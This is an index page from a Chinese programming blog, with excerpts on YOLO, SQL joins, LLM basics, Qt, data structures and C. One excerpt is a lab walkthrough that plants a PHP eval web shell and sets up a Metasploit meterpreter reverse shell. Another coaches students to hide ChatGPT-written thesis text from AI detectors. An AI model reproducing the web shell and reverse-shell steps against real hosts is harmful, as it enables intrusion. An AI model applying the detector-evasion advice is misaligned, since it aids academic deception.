<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.133.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大咖的博客">
		<meta property="og:url" content="https://bcdaka.github.io/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="编程大咖">
  <meta property="og:description" content="编程大咖的博客">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="website">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大咖">

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67700742c17e0720a6457012ca0618ad/" rel="bookmark">
			本科阶段最后一次竞赛Vlog——2024年智能车大赛智慧医疗组准备全过程——2Yolo使用之ONNX模型准备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本科阶段最后一次竞赛Vlog——2024年智能车大赛智慧医疗组准备全过程——2Yolo使用之ONNX模型准备 ​ 大家好，因为板端BPU环境，可以加速目标检测的速度，所以今天在此先给大家带来如何准备一个模型，下一期会给大家带来如何在板端部署这一期的目标识别模型
​ 本文给大家带来的是yolov5-2.0 版本，在我最先接触的就是这个板子，当时也是参考了地平线社区的大佬带来一些方法，当然这个参考是在下一期哈哈、
​ 这一期其方法上是通用的，出这一期也是能够方便大家以后学会yolo任何版本的使用。
​ 因为我没有研究很深入，我写是针对比赛，至于其他版本会不会在使用过程中有小坑，在地平线官网也是有教程的，大家需要其他版本的可以去看看其他大佬的文章。
1.获取目标检测源码 ​ 首先，是要获得yolov5-2.0得源码，正常情况是要教大家去github进行下载源码的，但是咳咳好像不太容易，因为“科学上网”
​ 当然下载完成2.0版本还有有很多bug的，这里给大家以附件形式给出我的源码吧
​ 下载的源码里主要由一下文件夹
2.数据准备与标记 ​ 要训练一个模型，首先需要一定的图片数据，然后标记，接下来开始告诉大家如何进行这些准备
​ 当然你首先要有Pyhton环境，这里就不教大家配置Python了，我这里使用的是Anaconda+Pycharm
​ 之前发现哔哩哔哩有好多讲解使用，大家可以看下
2.1 数据集准备 ​ 首先建立一个文件夹dataset，里面放置image和label，每个子文件夹里面放置train和test。然后把你的jpg或者png图片放在image的train里面
​ 2.2 数据标记 ​ 打开你的命令行，输入如下
pip install labelimg ​ 稍等安装完毕，然后在命令行输入，如下内容，你会发现弹出如下窗口
labelimg ​ 接下来点击View-选择第一行设置自动保存模式
​ 接下来点击 Open Dir——&gt;选择你刚才image所在的目录
​ 接下来选择 Change Save Dir 找到你的label文件夹里的train
​ ​ 最后保证选择Yolo模式
​ 此刻你就可以看到你的图片已经加载进来了
​ 这里把鼠标移动到页面里，按下键盘里w,会出现一个十字
​ 这时候你就可以，进行绘制矩形了，绘制完成后，就会出现一个提示框，这里写上你的标签
​ 当你打完这个标签之后，使用键盘键A和D，可以切换上一张，下一张，最后你标记完成你所有图片，应该是下面这个样子
​ 一个文件夹有图片，另外一个文件夹里面是txt格式文件
​ 3.配置文件 3.1目录结构 ​ 在你下载的源码中创建下面这样的文件夹，接下来，我将挨个进行刚才没有提及的文件进行解释
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67700742c17e0720a6457012ca0618ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/648557870dc6924e709b3122e27b79f8/" rel="bookmark">
			MSF回弹木马ubuntu测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网站地址为192.168.104.128
web.php内容为：
&lt;?php eval($_POST[123]); ?&gt; linux版本信息：20.04.1-Ubuntu
nginx信息：nginx-1.21.6
php信息：PHP 7.3.33-19
php-fpm信息：/etc/php/7.3/fpm/php-fpm.conf
一、使用蚁剑连接网站 在此页面，我们可以查看当前网页的文件，但是无法访问其他页面（权限不够）
我们可以右键打开虚拟终端来查看自己的权限
二、反弹性木马 1）生成木马文件webreverse.php
msfvenom -p php/meterpreter/reverse_tcp LHORT=192.168.104.128 LPOST=12345 -f php -o shellreverse.php 其内容为：
2）上传webreverse.php至网站
可以使用命令来传递文件
python3 -m http.server 999 在蚁剑中，我们选择右键上传文件，但是因为权限问题，会导致文件上传失败。所以可以选择降低目录权限或提高自己的权限
降低目录的权限：
此时上传webreverse文件
因为该php文件是一个反弹型木马，受害者会连接攻击者，所以需要我们去监听
3）监听端口
msfconsole use exploit/multi/handler set payload php/meterpreter/reverse_tcp set lhost 192.168.104.131 set lport 12345 exploit 访问192.168.104.128的shellreverse.php时，这台受害主机就会连接到我们的攻击主机中
4）提权
此时我们的权限是比较低，所以需要在此进行提权
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d3ee398f0ac7ce16ebb036fd0b59dbaa/" rel="bookmark">
			24 MySQL 多表联合查询·上（4）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在前几章中，大致了解了如何在一张表中读取数据，但是在真正的应用中，经常需要从数据库的两个或多个数据表中匹配读取数据。
注：以下SQL语句示例全部基于下面「user表」、「department表」「job表」：
user表
uidunamedepidjid1张三212李四223王铿344彭昶345王小二43 department表
depiddepnamemaster1总裁办李大宝2研发部张三3测试部王铿4开发小组A王潇潇5开发小组B尼古拉叶6财务部佳琪佳 job表
jidjname1高级开发工程师2Java工程师3前端开发4测试工程师5产品经理6财会 INNER JOIN（内连接,或等值连接）： 获取两个表中字段匹配关系的记录，即查询两表交集部分的数据。LEFT JOIN（左连接）: 获取左表所有记录，即使右表没有对应匹配的记录。RIGHT JOIN（右连接）： 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。 两表联合查询 --内连接：INNER JOIN SELECT * FROM user INNER JOIN department on user.depid = department.depid ; 或 SELECT * FROM user,department WHERE user.depid = department.depid; --查询「user表」「department表」中共有的数据。 结果如下：
uidunamedepidjiddepiddepnamemaster1张三212研发部张三2李四222研发部张三3王铿343测试部王铿4彭昶343测试部王铿5王小二434开发小组A王潇潇 --左连接：LEFT JOIN SELECT * FROM user u LEFT JOIN department d ON u.uname = d.master; --查询「user表」中所有的数据，和匹配上「department表」中的数据。 结果如下：
uidunamedepidjiddepiddepnamemaster1张三212研发部张三2李四22NullNullNull3王锵343测试部王锵4彭昶34NullNullNull5王小二43NullNullNull --右连接：RIGHT JOIN SELECT * FROM user u RIGHT JOIN department d ON u.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d3ee398f0ac7ce16ebb036fd0b59dbaa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22abdab3dc5993c4c84b51647c9b4a33/" rel="bookmark">
			ChatGPT停止论文：如何巧妙规避AI检测，让你的学术成果更有价值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		添加图片注释，不超过 140 字（可选）
大家好，我是阿九。
今天我们来聊聊如何在使用ChatGPT的同时，巧妙地避开AI检测，让你的论文更具学术价值。
关于这个话题，我总结出了一个4+1模型，即4个核心策略和1个重要提醒。
这个模型是我帮助近50位研究生和博士生完善论文后，实践验证出来的。
以后你们和同学朋友分享时，就可以用这个4+1模型，既容易记忆又实用高效。
四个核心策略是什么？
添加图片注释，不超过 140 字（可选）
第一：局部应用，避免全文AI痕迹。
第二：重组语句，保持原意的同时改变表达。
第三：增加个人见解，融入独特观点。
第四：使用专业术语，提升学术含金量。
为什么要局部应用，而不是让ChatGPT重写整篇论文呢？
这是因为AI生成的内容往往有其特定的语言模式，如果整篇论文都用AI生成，很容易被检测出来。
添加图片注释，不超过 140 字（可选）
而局部应用可以让AI生成的内容与你自己的写作风格自然融合，大大降低被识别的风险。
说到这里，阿九忍不住想起了一位博士生小李的经历。
他原本打算用ChatGPT重写整篇论文，结果被导师一眼看出不对劲。
后来按照我的建议，只在难以表达的部分使用AI辅助，最终顺利通过了审核。
接下来，让我们来谈谈如何重组语句。
具体来说，就是在保持原意的基础上，改变句子结构和用词。
添加图片注释，不超过 140 字（可选）
比如，你可以将一个长句拆分成几个短句，或者将多个短句合并成一个复杂句。
如何有效地重组语句呢？
我总结了一个3步法则。
第一步：理解原句的核心意思。
第二步：列出表达这个意思的不同方式。
第三步：选择最符合你写作风格的表达方式。
添加图片注释，不超过 140 字（可选）
举个例子，假设原句是研究结果表明，该方法在提高学习效率方面具有显著效果。
你可以这样重组：我们的实验证实，采用这种方法能够明显改善学习效率。
增加个人见解是避开AI检测的另一个关键。
ChatGPT生成的内容往往缺乏独特性，而加入你自己的观点可以让论文更具个人特色。
有一次，我指导的一位硕士生小王在论文中加入了自己对实验结果的独特解读。
这不仅让论文成功避开了AI检测，还得到了评审老师的高度赞扬。
添加图片注释，不超过 140 字（可选）
使用专业术语也是提升论文质量的重要手段。
AI生成的内容可能会使用较为通俗的语言，而增加专业术语不仅可以提高学术性，还能让论文更符合你所在领域的写作风格。
为了帮助大家更好地掌握这些技巧，阿九特意为核心成员准备了一份详细的AI辅助论文写作指南。
这份指南包含了20多个实用技巧，以及如何巧妙融合AI内容与个人见解的具体案例。
说完了四个核心策略，我们再来谈谈一个重要提醒。
那就是：保持论文的逻辑一致性。
添加图片注释，不超过 140 字（可选）
为什么这点如此重要？
因为在使用AI辅助写作时，很容易出现前后矛盾或逻辑断层的情况。
尤其是当你使用多次AI生成的内容时，更要注意各部分之间的连贯性。
我曾经遇到过一位学生，他的论文在引言部分提出了三个研究问题，但在结论部分却只回答了两个。
这种不一致很容易被老师发现，也会大大降低论文的质量。
为了避免这种情况，你可以试试这个方法：在完成初稿后，制作一个简单的思维导图，梳理整篇论文的逻辑结构。
添加图片注释，不超过 140 字（可选）
这样可以帮助你快速发现可能存在的逻辑问题。
运用这个4+1模型，你就能巧妙地规避AI检测，同时提升论文的学术价值。
记住，关键在于合理利用AI工具，而不是过度依赖。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/22abdab3dc5993c4c84b51647c9b4a33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a2d37ff447c9f5ac27e2032dfc37da0/" rel="bookmark">
			大型语言模型入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大型语言模型ChatGPT 快速、全面了解大型语言模型。学习李宏毅课程笔记。
ChatGPT
目前由OpenAI公司发明的非常火的人工智能AI应用ChatGPT，到底是什么原理呢？
G：Generative(生成)
P：Pre-trained(预训练)
T：Transformer(一种类神经网络模型)
当然，类似的AI技术还有其他，如：Google Bard、Anthropic Claude等等
ChatGPT背后原理 ChatGPT真正做的事情：就是“文字接龙”。
ChatGPT又叫大型语言模型，那什么是语言模型呢？
能做“文字接龙”的模型，其实就是语言模型。
那语言模型，是怎么回答人类问题的呢？
当输入问题“台湾最高的山是哪座？”的时候，ChatGPT会把它看作成为一个未完成的句子，它会选择一个最合理的字输出，如“玉”字；接下来，它会把上次的输出，接到这个问题后面，共同作为下次的输入，以此类推，直到ChatGPT输出“end”结束。
我们再详细一点看ChatGPT的原理：
比如，如果输入“台湾大”，后面可以接的字有很多可能，可以接“学”、“哥”、“车”等等。ChatGPT的输出其实是给每个可能输出的符号一个概率，比如在这个例子中，“学”出现的概率是50%,"车"出现的概率是25%…ChatGPT就按照这些字出现的机率掷色子，掷到“学”的概率最大。所以，ChatGPT每次输出的答案不一定相同。
我们把输出有可能选择的这些符号，就叫做Token。Token是语言模型中很重要的一个概念，甚至ChatGPT在计算价格的时候，都是用生成多少token，要花多少钱来收费。
Token 其实，每个语言模型的token还不一样，token是开发者事先设定好的，就是做文字接龙的时候你可以选择的符号，有个平台(https://platform.openai.com/tohenizer)可以查询openAI的某些语言模型的token是什么。
比如：I am unkillable，虽然是3个单词，却是6个token。
其中，unkillable就被拆成了3个token，即要做3次接龙。
那为什么不能把一个单词作为一个token呢？
因为英文单词无法穷举，因为token是一个可以被选则的符号，所以它必须是一个可以被穷举的东西，这样ChatGPT才能给每个token一个概率值，英文单词那么多，而且还不断有新的新的单词产生，所以用这种相当于字首字根的东西表示更为方便。
那中文的token是什么样呢？
在OpenAI的GPT系列中，通常不是把一个中文方块字当作一个token，一个中文方块字是好几个token，当然如果你想开发自己的人工智能，想把一个方块字就当作一个token，也是合理的。
掷色子 我们已经知道ChatGPT是按照这些token出现的机率掷色子而得到最后结果。所以，ChatGPT每次输出具有随机性，答案不一定相同。
那为什么不能选则输出概率最大的那个Token，而要以掷色子的形式输出呢？
因为每次输出概率最大的那个，不一定能得到最好的结果。可以看19年的这篇论文《The curious case of neural text degeneration》,每次选择概率最大的Token，模型就容易跳帧，不断loop不断讲一样的话，如果是掷色子的话，就能输出很自然的回答。
为甚么ChatGPT有时候也会输出一本正经的胡说八道的答案？
现在我们了解了ChatGPT真正做的事是文字接龙的话，就不难想象说为什么ChatGPT也会回答错误答案，因为这些答案都是凭借接龙接出来的，ChatGPT根本不在意这些答案是否真实或对错。
比如下面这个例子，让ChatGPT介绍台大的玫瑰花节，但是台大根本没有这个节日，它仍然会像模像样的给你一个答案，这个网址也是它自己瞎造的。
ChatGPT既然是做“文字接龙”，那它是怎么知道多轮对话的呢？即怎么知道一些历史信息的呢？
举个例子：
我不需要告诉它把什么翻译成英文，它自己就知道是要把上一个问题的答案翻译成英文，这是为什么呢？
就是在做文字接龙的时候，同一则对话里面，过去你问的问题+ChatGPT的输出+这次你的问题，都会作为新的输入。
文字接龙 语言模型是怎么学会做文字接龙的呢？
网络上的任何一句话，都可以作为语言模型的学习数据，比如“人工智慧真神奇！”这句话，模型看到后就知道，“人”后面接“工”的概率比较大，那就提高“人”后面出现“工”的概率…，"!"后面没话了，那就提高“end”的概率。
那语言模型是怎么输出这个概率分布的呢？
就是Transformer模型。详见其他博客。
ChatGPT历史 OpenAI 在2018年开始就研究有关GPT的模型了。
第一代GPT-1：
模型参数量只有117M，训练数据才1GB。
2019年诞生第二代GPT-2：
模型参数量1542M，训练数据40GB。
GPT-2也可以做问答任务，但是表现一般，正确率只有55%左右。
2020年诞生第三代GPT-3：
模型参数量175B，足足是GPT-2的100多倍呀！训练数据580GB，相当于阅读哈利波特全集30万遍，远超过一个正常人一辈子度过的资料量。
这一代的GPT-3已经会写代码了！
但在所有的任务上的表现也一般，准确率也是50%多左右。
GPT只从网络资料学习的缺点：
有人说OpenAI走错方向了，看起来再怎么做文字接龙，也接不出一个通用的人工智能出来。但是OpenAI并没有放弃，他们有篇论文说其实GPT-3已经很聪明了，但它表现不好的原因就是，它不知道人类社会的规则，不知道人类的需求。它就像一个山野里长大的小孩，它只见过网络上的东西，在网络上随便乱学，它并不知道要做什么事情，甚至不知道要回答问题。
论文举了如下例子：
我们问它C在下面这段代码里面的含义是什么，它的回答是4个选项，可能因为网络上有很多考题，它在网络上学到的就是看到一个问题，对应四个选项。
ChatGPT-3.5，也就是第3.5代模型
这次引入了监督式学习，就是人类老师教给它，想要让它做的事情。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a2d37ff447c9f5ac27e2032dfc37da0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54729870629ba044ce1d4b8fbca1061d/" rel="bookmark">
			GoLang 安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		golang学习笔记 goland 安装 To use Go programming language in Visual Studio Code (VSCode), you can follow these steps:
1. Install Go: Download and install the latest version of Go from the official Go website (https://golang.org/dl/).
2. Install VSCode: Download and install Visual Studio Code from the official VSCode website (https://code.visualstudio.com/download).
3. Install the Go extension for VSCode: Open VSCode and go to the Extensions view by clicking on the square icon on the left sidebar or by pressing "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54729870629ba044ce1d4b8fbca1061d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64edf34d4f0c33799021d1d60374aded/" rel="bookmark">
			【QT】Qt 文件操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		qt 文件 qt 文件1. Qt 文件概述2. 输入输出设备类3. 文件读写类4. 文件和目录信息类 qt 文件 1. Qt 文件概述 文件操作是应用程序必不可少的部分。Qt 作为⼀个通用开发库，提供了跨平台的文件操作能力。 Qt 提供了很多关于文件的类，通过这些类能够对文件系统进行操作，如文件读写、文件信息获取、文件复制或重命名等。
2. 输入输出设备类 在 Qt 中，文件读写的类为 QFile 。QFile 的父类为 QFileDevice ，QFileDevice 提供了文件交互操作的底层功能。 QFileDevice 的父类是 QIODevice，QIODevice 的父类为 QObject 。
QIODevice 是 Qt 中所有输入输出设备（input/output device，简称 I/O 设备）的基础类，I/O 设备就是能进行数据输入和输出的设备，例如文件是⼀种 I/O 设备，网络通信中的 socket 是 I/O 设备， 串口、蓝牙等通信接口也是 I/O 设备，所以它们也是从 QIODevice 继承来的。Qt 中主要的一些 I/O 设备类的继承关系如下图所示：
上图中各类的说明如下：
QFile 是用于文件操作和文件数据读写的类，使用 QFile 可以读写任意格式的文件QSaveFile 是用于安全保存文件的类。使⽤ QSaveFile 保存文件时，它会先把数据写⼊一个临时文件，成功提交后才将数据写入最终的文件。如果保存过程中出现错误，临时文件里的数据不会被写入最终文件，这样就能确保最终文件中不会丢失数据或被写入部分数据。 在保存比较打的文件或复杂格式的文件时可以使用这个类，例如从网络上下载文件等QTemporaryFile 是用于创建临时文件的类。使用函数 QTemporaryFile::open() 就能创建一个文件名唯一的临时文件，在 QTemporaryFile 对象被删除时，临时文件被自动删除QTcpSocket 和 QUdpSocket 是分别实现了 TCP 和 UDP 的类QSerialPort 是实现了串口通信的类，通过这个类可以实现计算机与串口设备的通信QBluetoothSocket 是用于蓝牙通信的类。手机和平板计算机等移动设备有蓝牙通信模块，笔记本电脑⼀般也有蓝牙通信模块。通过 QBluetoothSocket 类，就可以编写蓝牙通信程。如编程实现笔记本电脑与手机的蓝牙通信QProcess 类用于启动外部程序，并且可以给程序传递参数QBuffer 以⼀个 QByteArray 对象作为数据缓冲区，将 QByteArray 对象当作⼀个 I/O 设备来读写 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64edf34d4f0c33799021d1d60374aded/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57fc2a7c4fc7cd1f327ea9fddf46bb9a/" rel="bookmark">
			B&#43;树与B*树：扩展B树的高级应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		B+树与B*树：扩展B树的高级应用 1. 引言 B+树和B树是B树的扩展形式，它们在数据库系统、文件系统以及索引结构中广泛应用。B+树和B树提供了更高效的数据查找、插入和删除操作，同时优化了存储空间的利用率。本篇文章将详细介绍B+树和B*树的概念、特点及其在实际应用中的实现。
2. B树概述 2.1 B树定义
B树（B-Tree）是一种自平衡的树数据结构，能够保持数据的有序性，并支持高效的插入、删除和查找操作。B树的主要特点包括：
每个节点可以有多个子节点。所有叶子节点在同一层。每个节点有一个范围（key范围）来决定存储在节点中的数据。 2.2 B树的基本性质
节点容量：B树的每个节点可以包含多个键值对。通常，节点的键值对数量在一个固定的范围内。平衡性：B树保持平衡，即所有叶子节点都在同一层，从而确保了查找操作的时间复杂度为O(log_n N)。 3. B+树介绍 3.1 B+树的定义
B+树是B树的一种变体，其中所有数据都存储在叶子节点中，而内部节点只存储索引信息。叶子节点通过链表连接，形成一个有序的数据序列。B+树的主要特点包括：
叶子节点：包含所有实际的数据记录，并且叶子节点通过指针链接成一个链表。内部节点：只存储键值和指向子节点的指针，不存储实际的数据记录。 3.2 B+树的优点
范围查询效率高：由于叶子节点通过链表连接，范围查询变得非常高效。数据访问一致性：所有数据都存储在叶子节点，便于统一管理。更高的存储密度：叶子节点包含数据，内部节点存储索引，因此可以存储更多的索引信息。 3.3 B+树的实现
以下是B+树的Python实现示例：
class BPlusTreeNode: def __init__(self, is_leaf=False, degree=3): self.is_leaf = is_leaf self.degree = degree self.keys = [] self.children = [] self.next = None # 用于连接叶子节点 class BPlusTree: def __init__(self, degree=3): self.root = BPlusTreeNode(is_leaf=True, degree=degree) self.degree = degree def search(self, key, node=None): if node is None: node = self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57fc2a7c4fc7cd1f327ea9fddf46bb9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98a941a25a14f785a2e988dd059a879d/" rel="bookmark">
			Educational Codeforces Round 168 E. Level Up
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原题链接：Problem - E - Codeforces
题意：有n个怪物，每个怪物都有一个等级，主角从左到右打怪物，如果主角的等级严格大于了怪物的等级，那么怪物就会逃跑，主角每升一级需要杀死k个怪物，多组询问题目给出第几个怪物和升级一次需要杀死的怪物，问主角能不能和这个怪物战斗？
思路：二分+树状数组。可以发现一个明显的规律，如果k越小那么，主角升级的一定越快，那么主角从1到i(i代表题目里面问能不能战斗的怪物的位置)，可以发现是具有单调性的，那便是k大于等于某个值之后，主角一定和怪物战斗，那么就可以二分的寻找这个最小的k。二分最重要的就是检查中间值是否合理了，每次check的是时候，去比较一下当前怪物等级*mid和k=mid的时候前面能够杀死几个怪物，当前怪物等级*mid这个很容易就可以得到，后者因该如何得到呢？可以每次二分结束后将值放入树状数组里面维护，如果下一次给出的mid大于等于当前点的结果，那么这个怪物就可以提供贡献，然后查询一下大于mid的怪物有多少个，就可以了。每个点拿数组在记录一下，对于每组询问判断一下题目给出的k是大于等于求出来的还是小于求出来的。
//冷静，冷静，冷静 //调不出来就重构 #pragma GCC optimize(2) #pragma GCC optimize("O3") #include&lt;bits/stdc++.h&gt; #define endl '\n' using namespace std; typedef long long ll; typedef long double ld; typedef pair&lt;ll,ll&gt; pii; const int N=1e6+10,mod=1000000007; ll t[N],p[N],op[N]; ll lowbit(ll x){return x&amp;(-x);} void add(ll x,ll vel) { while(x&lt;N) { t[x]+=vel; x+=lowbit(x); } } ll query(ll x) { ll ans=0; while(x) { ans+=t[x]; x-=lowbit(x); } return ans; } bool is(ll x,ll v) { return p[x]*v&gt;query(v);//v为每次升级需要杀死的怪物，p[x]为当前怪物的等级，杀死v*p[x]主角的等级就会超过p[x] //query(v)是查询v情况下，能够杀死几只怪物 } int main() { ios::sync_with_stdio(0),cin.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98a941a25a14f785a2e988dd059a879d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/389df3a82329da138535bf9ae0af2689/" rel="bookmark">
			C语言自定义类型结构体与位段超详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 结构体类型的声明1. 1 结构体声明1. 2 结构体变量的创建和初始化1. 3 结构体的特殊声明1. 3 结构体的自引用 2. 结构体内存对齐2. 1 对齐规则2. 2 为什么存在内存对齐2. 3 修改默认对齐数 3. 结构体传参4. 结构体实现位段4. 1 什么是位段4. 2 位段成员的内存分配4. 3 位段的跨平台问题4. 4 位段的使用4. 5 位段使用的注意事项 1. 结构体类型的声明 1. 1 结构体声明 格式如下：
struct tag { member - list;//结构成员，可以不止一个 }variable - list;//在这里可以直接创建结构体变量，可以用逗号隔开来创建多个，不能初始化 例如描述一个学生：
struct student	//这个结构体的名称 {	//以下是结构成员 char name[20];	//姓名 char sex[5];	//性别 int age;	//年龄 char id[10];	//学号 }A, B;	//声明结构体时创建了学生A和B，注意分号不能丢 进行声明时，还可以使用 typedef 进行重命名：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/389df3a82329da138535bf9ae0af2689/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7ba8d96dba5321ac2bf8691285790b8/" rel="bookmark">
			鸿蒙购物车布局完成后的点击事件（不怎么通俗易懂）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import router from '@ohos.router'; import { ShopCarEntity } from '../../entity/ShopCarEntity'; import LocDataModel from '../../viewmodel/LocDataModel'; import data from '@ohos.telephony.data'; @Entry @Component export default struct CarPage { @State carList:ShopCarEntity[]=LocDataModel.DEFAULT_SHOP_CART_LIST @State totalPrice :number =0 @State totalCount:number =0 //计算总价和数量 countTotalNumber(){ let tempTotalPrice=0 let temTotalCount=0 this.carList.forEach((item:ShopCarEntity)=&gt;{ if (item.isSelected) { tempTotalPrice+=item.goods_default_price*item.count temTotalCount+=item.count } }) this.totalPrice=tempTotalPrice this.totalCount=temTotalCount } //处理商品单选操作 carItemSelectChanged(state:boolean,index:number){ let newCarlist:ShopCarEntity[]=[] this.carList.forEach((item:ShopCarEntity,itemIndex:number)=&gt;{ if (itemIndex===index) { item.isSelected=state item.itemkey=`${Math.random()*10}-${Math.random()}` } newCarlist.push(item) }) this.carList=newCarlist } build() { Flex({direction:FlexDirection.Column}){ //标题部分 this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7ba8d96dba5321ac2bf8691285790b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/072867b857ea28ee791d1832ab9d1551/" rel="bookmark">
			C语言数据在内存中的存储超详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 整数在内存中的存储2. 大小端字节序和字节序判断2. 1 什么是大小端？2. 2 为什么会有大小端？2. 3 练习 3. 浮点数在内存中的存储3. 1 一个代码3. 2 浮点数的存储3. 2. 1 浮点数存的过程3. 2. 2 浮点数取的过程3. 3 题目解析 1. 整数在内存中的存储 在操作符的博客中，我们就了解过了下面的内容：
整数的二进制表示方法有三种，即原码、反码和补码，有符号的整数，三种表示方法均有符号位和数值位两部分，符号位都是用0表示“正”，用1表 示“负”，最高位的一位是被当做符号位，剩余的都是数值位。正整数的原、反、补码都相同。
负整数的三种表示方法各不相同。原码：直接将数值按照正负数的形式翻译成二进制得到的就是原码
反码：将原码的符号位不变，其他位依次按位取反就可以得到反码
补码：反码+1就得到补码。 实际上对于整形来说：数据存放在内存中的是补码。
为什么呢？
在计算机系统中，数值一律用补码来表示和存储。
原因在于，使用补码，可以将符号位和数值域统一处理。
同时，加法和减法也可以统一处理(CPU只有加法器)此外，补码与原码相互转换，其运算过程是
相同的，不需要额外的硬件电路。
关于 其运算过程是相同的 这一点：正整数不必赘述，负数的补码是原码取反+1，如果要从补码得到原码的操作应该是-1再取反，但实际上由于是二进制，取反+1也能得到原码，因此说补码和反码的转换是相同的。
2. 大小端字节序和字节序判断 在了解了数据整数在内存中的存储之后，我们通过调试来看一个细节：
来看这个代码：
#include&lt;stdio.h&gt; int main() { int a = 0x11223344; return 0; } 这里给int 变量a赋值了八进制的 11223344，那它在内存中是这么存储的吗？我们来看一看：
调试的时候，我们可以看到在a中的 0x11223344 这个数字是按照字节为单位，倒着存储的。这是为什么呢?
2. 1 什么是大小端？ 其实超过一个字节的数据在内存中存储的时候，就有存储顺序的问题，按照不同的存储顺序，我们分为大端字节序存储和小端字节序存储，下面是具体的概念:
大端(存储)模式:
是指数据的低位字节内容保存在内存的高地址处，而数据的高位字节内容，保存在内存的低地址处。
小端(存储)模式:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/072867b857ea28ee791d1832ab9d1551/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46acdc9ade65aca2be032fd498493fa3/" rel="bookmark">
			【研发日记】Matlab/Simulink技能解锁(十二)——Stateflow中的两种状态机嵌套对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言
项目背景
两级状态机
函数状态机
分析和应用
总结
参考资料
前言 见《【研发日记】Matlab/Simulink技能解锁(七)——两种复数移相算法》
见《【研发日记】Matlab/Simulink技能解锁(八)——分布式仿真》
见《【研发日记】Matlab/Simulink技能解锁(九)——基于嵌入式处理器仿真》
见《【研发日记】Matlab/Simulink技能解锁(十)——PID调参技巧》
见《【研发日记】Matlab/Simulink技能解锁(十一)——Stateflow中的en、du、ex应用对比》
项目背景 近期使用Simulink开发的嵌入式项目中，用到了Stateflow中的状态机嵌套，使用过程中发现了两种嵌套方式存在关键的差异，极易踩坑。查阅官方文档并没有找到相应的解释。利用周末时间亲自摸索了一下，把它们的一些基本规律和技巧总结下来。
